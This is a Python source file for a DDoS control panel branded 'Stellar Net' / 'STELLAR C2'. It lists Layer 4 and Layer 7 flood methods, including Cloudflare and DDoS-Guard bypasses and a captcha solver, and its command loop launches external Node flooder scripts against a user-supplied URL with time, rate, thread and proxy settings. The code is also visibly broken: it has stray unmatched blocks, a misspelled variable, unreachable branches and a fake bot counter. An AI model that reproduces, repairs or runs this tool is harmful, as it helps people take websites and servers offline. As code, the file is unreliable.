import socket
import time
import os
import requests
import sys
import random
import datetime
import pytz
import getpass
dt_mtn = datetime.datetime.now()

mtn_tz = pytz.timezone('US/Mountain')
dt_mtn = mtn_tz.localize(dt_mtn)

# print(dt_mtn)

dt_east = dt_mtn.astimezone(pytz.timezone('US/Eastern'))
# print(dt_east)




today = dt_mtn.strftime('%B %d, %Y')

def clear():
    os.system('cls' if os.name == 'nt' else 'clear')

      elif 'layer7' in cnc:
            clear()
            l7()
        
        elif 'layer4' in cnc:
            clear()
            l4()

        elif 'help' in cnc:
            print("""
╔═════
║  layer7 : Layer 7 Attack Methods
║  layer4 : Layer 4 Attack Methods
║  clear  : Clear the console
╚═════
""")

        elif cnc == 'clear' or cnc == 'cls':
            main()

def l4():
    print(f'''
                                \x1b[38;2;8;140;255m.▄▄ · ▄▄▄▄\x1b[38;2;54;163;255m▄▄▄▄ .▄\x1b[38;2;100;186;254m▄▌  ▄\x1b[38;2;145;209;254m▄▌   \x1b[38;2;191;232;253m▄▄▄·\x1b[38;2;237;255;253m ▄▄▄  
                                \x1b[38;2;8;140;255m▐█ ▀. •██\x1b[38;2;54;163;255m  ▀▄.▀·█\x1b[38;2;100;186;254m█•  █\x1b[38;2;145;209;254m█•  ▐\x1b[38;2;191;232;253m█ ▀█\x1b[38;2;237;255;253m ▀▄ █·
                                \x1b[38;2;8;140;255m▄▀▀▀█▄ ▐█.\x1b[38;2;54;163;255m▪▐▀▀▪▄█\x1b[38;2;100;186;254m█▪  █\x1b[38;2;145;209;254m█▪  ▄\x1b[38;2;191;232;253m█▀▀█ \x1b[38;2;237;255;253m▐▀▀▄ 
                                \x1b[38;2;8;140;255m▐█▄▪▐█ ▐█▌\x1b[38;2;54;163;255m·▐█▄▄▌▐\x1b[38;2;100;186;254m█▌▐▌▐\x1b[38;2;145;209;254m█▌▐▌▐\x1b[38;2;191;232;253m█ ▪▐▌\x1b[38;2;237;255;253m▐█•█▌
                                \x1b[38;2;8;140;255m ▀▀▀▀  ▀▀▀\x1b[38;2;54;163;255m  ▀▀▀ .\x1b[38;2;100;186;254m▀▀▀ .\x1b[38;2;145;209;254m▀▀▀  \x1b[38;2;191;232;253m▀  ▀ \x1b[38;2;237;255;253m.▀  ▀
                                          Layer 4 Methods
                                \x1b[38;2;8;140;255m═════════╦════════════════╦══════════ 
                        \x1b[38;2;8;140;255m╔════════════════╩════════════════╩════════════════╗
             \x1b[38;2;8;140;255m╔══════════╩══════════╦══╦═════════════════════╦═══╦══════════╩══════════╗
             \x1b[38;2;8;140;255m║  \x1b[38;2;237;255;253mudp-god            \x1b[38;2;8;140;255m║ L║  \x1b[38;2;237;255;253mtelnet             \x1b[38;2;8;140;255m║ L ║  \x1b[38;2;237;255;253m<empty>              \x1b[38;2;8;140;255m║
             \x1b[38;2;8;140;255m║  \x1b[38;2;237;255;253mhome-lag           \x1b[38;2;8;140;255m║  ║  \x1b[38;2;237;255;253m<empty>            \x1b[38;2;8;140;255m║   ║  \x1b[38;2;237;255;253m<empty>            \x1b[38;2;8;140;255m║
             \x1b[38;2;8;140;255m║  \x1b[38;2;237;255;253mhaven-god          \x1b[38;2;8;140;255m║ 4║  \x1b[38;2;237;255;253m<empty>            \x1b[38;2;8;140;255m║ 4 ║  \x1b[38;2;237;255;253m<empty>            \x1b[38;2;8;140;255m║
             \x1b[38;2;8;140;255m╚═════════════════════╩══╩═════════════════════╩═══╩═════════════════════╝
    ''')

def l7():
    print(f'''
                                \x1b[38;2;8;140;255m.▄▄ · ▄▄▄▄\x1b[38;2;54;163;255m▄▄▄▄ .▄\x1b[38;2;100;186;254m▄▌  ▄\x1b[38;2;145;209;254m▄▌   \x1b[38;2;191;232;253m▄▄▄·\x1b[38;2;237;255;253m ▄▄▄  
                                \x1b[38;2;8;140;255m▐█ ▀. •██\x1b[38;2;54;163;255m  ▀▄.▀·█\x1b[38;2;100;186;254m█•  █\x1b[38;2;145;209;254m█•  ▐\x1b[38;2;191;232;253m█ ▀█\x1b[38;2;237;255;253m ▀▄ █·
                                \x1b[38;2;8;140;255m▄▀▀▀█▄ ▐█.\x1b[38;2;54;163;255m▪▐▀▀▪▄█\x1b[38;2;100;186;254m█▪  █\x1b[38;2;145;209;254m█▪  ▄\x1b[38;2;191;232;253m█▀▀█ \x1b[38;2;237;255;253m▐▀▀▄ 
                                \x1b[38;2;8;140;255m▐█▄▪▐█ ▐█▌\x1b[38;2;54;163;255m·▐█▄▄▌▐\x1b[38;2;100;186;254m█▌▐▌▐\x1b[38;2;145;209;254m█▌▐▌▐\x1b[38;2;191;232;253m█ ▪▐▌\x1b[38;2;237;255;253m▐█•█▌
                                \x1b[38;2;8;140;255m ▀▀▀▀  ▀▀▀\x1b[38;2;54;163;255m  ▀▀▀ .\x1b[38;2;100;186;254m▀▀▀ .\x1b[38;2;145;209;254m▀▀▀  \x1b[38;2;191;232;253m▀  ▀ \x1b[38;2;237;255;253m.▀  ▀
                                          Layer 7 Methods
                                \x1b[38;2;8;140;255m═════════╦════════════════╦══════════ 
                        \x1b[38;2;8;140;255m╔════════════════╩════════════════╩════════════════╗
             \x1b[38;2;8;140;255m╔══════════╩══════════╦══╦═════════════════════╦═══╦══════════╩══════════╗
             \x1b[38;2;8;140;255m║  \x1b[38;2;237;255;253mcfnuke             \x1b[38;2;8;140;255m║L ║  \x1b[38;2;237;255;253mgoat-bypass        \x1b[38;2;8;140;255m║ L ║  \x1b[38;2;237;255;253mhttp-raw           \x1b[38;2;8;140;255m║
             \x1b[38;2;8;140;255m║  \x1b[38;2;237;255;253mmh-cfb             \x1b[38;2;8;140;255m║  ║  \x1b[38;2;237;255;253mcfsocket           \x1b[38;2;8;140;255m║   ║  \x1b[38;2;237;255;253mhttp-root          \x1b[38;2;8;140;255m║
             \x1b[38;2;8;140;255m║  \x1b[38;2;237;255;253mmh-cfuam           \x1b[38;2;8;140;255m║7 ║  \x1b[38;2;237;255;253mmh-ddosguard       \x1b[38;2;8;140;255m║ 7 ║  \x1b[38;2;237;255;253mhttp-get           \x1b[38;2;8;140;255m║
             \x1b[38;2;8;140;255m╠═════════════════════╬══╬═════════════════════╬═══╬═════════════════════╝
             \x1b[38;2;8;140;255m╠═════════════════════╬══╬═════════════════════╬═══╬═════════════════════╗
             \x1b[38;2;8;140;255m║  \x1b[38;2;237;255;253mmh-post            \x1b[38;2;8;140;255m║L ║  \x1b[38;2;237;255;253mmh-dyn             \x1b[38;2;8;140;255m║ L ║  \x1b[38;2;237;255;253m<empty>            \x1b[38;2;8;140;255m║
             \x1b[38;2;8;140;255m║  \x1b[38;2;237;255;253mmh-head            \x1b[38;2;8;140;255m║  ║  \x1b[38;2;237;255;253mmh-google          \x1b[38;2;8;140;255m║   ║  \x1b[38;2;237;255;253m<empty>            \x1b[38;2;8;140;255m║
             \x1b[38;2;8;140;255m║  \x1b[38;2;237;255;253mmh-pps             \x1b[38;2;8;140;255m║7 ║  \x1b[38;2;237;255;253mhcaptcha-solver    \x1b[38;2;8;140;255m║ 7 ║  \x1b[38;2;237;255;253m<empty>            \x1b[38;2;8;140;255m║
             \x1b[38;2;8;140;255m╚═════════════════════╩══╩═════════════════════╩═══╩═════════════════════╝
''')
    

def main():
    clear()
    print(f'''
                                \x1b[38;2;8;140;255m.▄▄ · ▄▄▄▄\x1b[38;2;54;163;255m▄▄▄▄ .▄\x1b[38;2;100;186;254m▄▌  ▄\x1b[38;2;145;209;254m▄▌   \x1b[38;2;191;232;253m▄▄▄·\x1b[38;2;237;255;253m ▄▄▄  
                                \x1b[38;2;8;140;255m▐█ ▀. •██\x1b[38;2;54;163;255m  ▀▄.▀·█\x1b[38;2;100;186;254m█•  █\x1b[38;2;145;209;254m█•  ▐\x1b[38;2;191;232;253m█ ▀█\x1b[38;2;237;255;253m ▀▄ █·
                                \x1b[38;2;8;140;255m▄▀▀▀█▄ ▐█.\x1b[38;2;54;163;255m▪▐▀▀▪▄█\x1b[38;2;100;186;254m█▪  █\x1b[38;2;145;209;254m█▪  ▄\x1b[38;2;191;232;253m█▀▀█ \x1b[38;2;237;255;253m▐▀▀▄ 
                                \x1b[38;2;8;140;255m▐█▄▪▐█ ▐█▌\x1b[38;2;54;163;255m·▐█▄▄▌▐\x1b[38;2;100;186;254m█▌▐▌▐\x1b[38;2;145;209;254m█▌▐▌▐\x1b[38;2;191;232;253m█ ▪▐▌\x1b[38;2;237;255;253m▐█•█▌
                                \x1b[38;2;8;140;255m ▀▀▀▀  ▀▀▀\x1b[38;2;54;163;255m  ▀▀▀ .\x1b[38;2;100;186;254m▀▀▀ .\x1b[38;2;145;209;254m▀▀▀  \x1b[38;2;191;232;253m▀  ▀ \x1b[38;2;237;255;253m.▀  ▀
                                   Sending meteorites to servers...
                      \x1b[38;2;8;140;255m════════\x1b[38;2;54;163;255m═════╦══════\x1b[38;2;100;186;254m════════\x1b[38;2;145;209;254m════════\x1b[38;2;191;232;253m══════╦══\x1b[38;2;237;255;253m════════════
                  \x1b[38;2;8;140;255m╔═══════════\x1b[38;2;54;163;255m═════╩══════\x1b[38;2;100;186;254m════════\x1b[38;2;145;209;254m════════\x1b[38;2;191;232;253m══════╩══\x1b[38;2;237;255;253m═══════════════╗
                  \x1b[38;2;8;140;255m║ \x1b[38;2;0;243;255m - - - - - - - -   \x1b[38;2;191;232;253mWelcome to Stellar Net   \x1b[38;2;0;243;255m- - - - - - - -   \x1b[38;2;237;255;253m║
                  \x1b[38;2;8;140;255m║ \x1b[38;2;0;243;255m- - - - - - - \x1b[38;2;191;232;253mType [help] to see the commands \x1b[38;2;0;243;255m- - - - - - - - \x1b[38;2;237;255;253m║
                  \x1b[38;2;8;140;255m╚═══════════\x1b[38;2;54;163;255m════════════\x1b[38;2;100;186;254m════════\x1b[38;2;145;209;254m════════\x1b[38;2;191;232;253m═════════\x1b[38;2;237;255;253m═══════════════╝
              \x1b[38;2;8;140;255m╔═══════════════\x1b[38;2;54;163;255m════════════\x1b[38;2;100;186;254m════════\x1b[38;2;145;209;254m════════\x1b[38;2;191;232;253m═════════\x1b[38;2;237;255;253m════════════════════╗
              \x1b[38;2;8;140;255m║ \x1b[38;2;0;243;255m- - - - - - - - - - - \x1b[38;2;191;232;253mConnection is \x1b[38;2;8;255;0m(ESTABLISHED.) \x1b[38;2;0;243;255m- - - - - - - - - - \x1b[38;2;237;255;253m║
              \x1b[38;2;8;140;255m╚═══════════════\x1b[38;2;54;163;255m════════════\x1b[38;2;100;186;254m════════\x1b[38;2;145;209;254m════════\x1b[38;2;191;232;253m═════════\x1b[38;2;237;255;253m════════════════════╝
''')    
    while True:
        cnc = input(f'''\x1b[38;2;8;140;255m╔═══[root@\x1b[38;2;100;186;254mA\x1b[38;2;145;209;254md\x1b[38;2;191;232;253mmi\x1b[38;2;237;255;253mn]
\x1b[38;2;8;140;255m╚═\x1b[38;2;54;163;255m═\x1b[38;2;100;186;254m═\x1b[38;2;145;209;254m═\x1b[38;2;191;232;253m═\x1b[38;2;237;255;253m═> ''')

        if 'http' in cnc:
            try:
                url = cnc.split()[1]
                time = cnc.split()[2]
                rps = cnc.split()[3]
                threads = cnc.split()[4]
                proxy = cnc.split()[5]
                os.system(f'node 404.js {urt} {time} {rps} {threads} {proxy}')
            except IndexError:
                print('Usage: http <HOST> <TIME> <RPS> <THREADS> <PROXY>.')

        elif 'https' in cnc:
            try:
                url = cnc.split()[1]
                time = cnc.split()[2]
                threads = cnc.split()[3]
                proxy = cnc.split()[4]
                rps = cnc.split()[5]
                os.system(f'node HTTPS.js {url} {time} {threads} {proxy} {rps}')
            except IndexError:
                print('Usage: https <url> <time> <threads> <proxy> <rps>')

        elif 'tls' in cnc:
            try:
                url = cnc.split()[1]
                time = cnc.split()[2]
                rps = cnc.split()[3] 
                threads = cnc.split()[4]
                os.system(f'node TLS.js {url} {time} {rps} {threads}')
            except IndexError:
                print('Usage: tls <url> <time> <rps> <threads>')

        elif 'sky' in cnc:
            try:
                url = cnc.split()[1]
                time = cnc.split()[2]
                rps = cnc.split()[3] 
                threads = cnc.split()[4]
                proxy = cnc.split()[5] 
                os.system(f'node SKY.SKY.js {url} {time} {rps} {threads} {proxy}')
            except IndexError:
                print('Usage: sky <url> <time> <rps> <threads> <proxy>')

        elif 'http-mix' in cnc:
            try:
                url = cnc.split()[1]
                time = cnc.split()[2]
                requests = cnc.split()[3]
                os.system(f'node HTTP-MIX.js {url} {time}')
            except IndexError:
                print('Usage: http-mix <url> <time>')

        elif 'bypass-flood' in cnc:
            try:
                url = cnc.split()[1]
                time = cnc.split()[2]
                threads = cnc.split()[3]
                proxy = cnc.split()[4]
                rps = cnc.split()[5]
                bypass= cnc.split()[6]
                flood = cnc.split()[6]
                os.system(f'node flooderv2.js {url} {time} {threads} {proxy} {rps} {bypass/flood}')
            except IndexError:
                print('Usage: bypass-flood <url> <time> <threads> <proxy> <rps> <bypass/flood>')

        elif 'download new proxy' in cnc:
            try:
                os.system(f'python3 scrape.py')


  
      
def login():
    clear()
    user = ""
    passwd = ""
    username = input("</>username: ")
    password = getpass.getpass(prompt='</>password: ')
    if username != user or password != passwd:
        print("")
        print("Fail")
        sys.exit(1)
    elif username == user and password == passwd:
        print("STELLAR C2")
        time.sleep(0.3)

login()


if __name__ == "__main__":
    try:
        bots = (random.randint(98,358))
        sys.stdout.write(f"\x1b]2;Stellar Net > Bots: [{bots}] | Online Users: [1] | Methods: [19] | Bypass: [8]\x07")
        main()
    except KeyboardInterrupt:
        print('Bye!\n')
